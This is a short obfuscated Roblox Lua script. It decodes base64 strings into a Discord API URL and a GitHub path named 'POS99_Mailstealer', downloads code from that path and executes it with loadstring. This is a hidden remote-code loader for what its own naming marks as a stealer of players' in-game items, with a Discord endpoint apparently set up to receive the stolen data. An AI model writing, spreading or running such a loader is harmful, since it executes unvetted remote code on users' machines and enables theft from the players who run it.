-- Obfuscated script
local _0x1a2b = "SmFkZXMgaGVyZTEwMg==" -- Base64 encoded "Jades_here102"
local _0x3c4d = true
local _0x5e6f = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvYmVhcm5zLzEyODMxMzAwODU5NDU5MTc2NS9MLWlCQlNVTExFNjE1V0NkLVI0cTVueW8xNW5LRUpRZzJ2aTdHSDJzM1lHMlVldERlVFV1X1BUVGxIZ0E=" -- Base64 encoded URL

-- Function to decode Base64
local function _0x7d8e(_0x8f9a)
    local _0xa1b2 = game:GetService("HttpService"):DecodeBase64(_0x8f9a)
    return _0xa1b2
end

-- Function to fetch script
local function _0xc9d0(_0x4a5b)
    local _0xb8c1 = game:HttpGet(_0x4a5b)
    return _0xb8c1
end

-- Decoded URL and script URL
local _0xe2f3 = _0x7d8e(_0x5e6f)
local _0x9a8b = "aHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9LaXUuUE9TOTlfTWFpbHN0ZWFsZXIvYWxpdmU=" -- Base64 encoded script URL
local _0x0b1c = _0xc9d0(_0x7d8e(_0x9a8b))

-- Execute the script
loadstring(_0x0b1c)()
